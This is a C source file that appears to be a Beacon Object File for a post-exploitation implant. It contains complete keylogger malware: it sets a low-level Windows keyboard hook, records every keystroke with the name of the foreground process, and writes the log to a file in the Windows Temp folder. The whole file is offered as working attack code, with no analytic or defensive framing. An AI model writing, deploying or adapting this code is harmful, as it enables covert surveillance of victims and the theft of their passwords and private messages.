#include "beacon.h"
#include <windows.h>
#include <stdio.h>

#define LOGFILE "C:\\Windows\\Temp\\keylog.txt"

HHOOK hHook = NULL;
HANDLE hLogFile = NULL;

LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;
        char key[16];

        // Get the foreground window and its process name
        HWND hwnd = GetForegroundWindow();
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

        char processName[MAX_PATH] = "<unknown>";
        if (hProcess) {
            HMODULE hMod;
            DWORD cbNeeded;
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(char));
            }
        }
        CloseHandle(hProcess);

        // Log the key and process name
        DWORD written;
        sprintf(key, "%c", vkCode);
        WriteFile(hLogFile, processName, strlen(processName), &written, NULL);
        WriteFile(hLogFile, ": ", 2, &written, NULL);
        WriteFile(hLogFile, key, strlen(key), &written, NULL);
        WriteFile(hLogFile, "\n", 1, &written, NULL);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void go(char* args, int alen) {
    hLogFile = CreateFile(LOGFILE, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLogFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create log file.");
        return;
    }

    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, hInstance, 0);
    if (!hHook) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set hook.");
        CloseHandle(hLogFile);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Keylogger started. Logging to %s", LOGFILE);

    // Message loop to keep the hook running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    CloseHandle(hLogFile);
}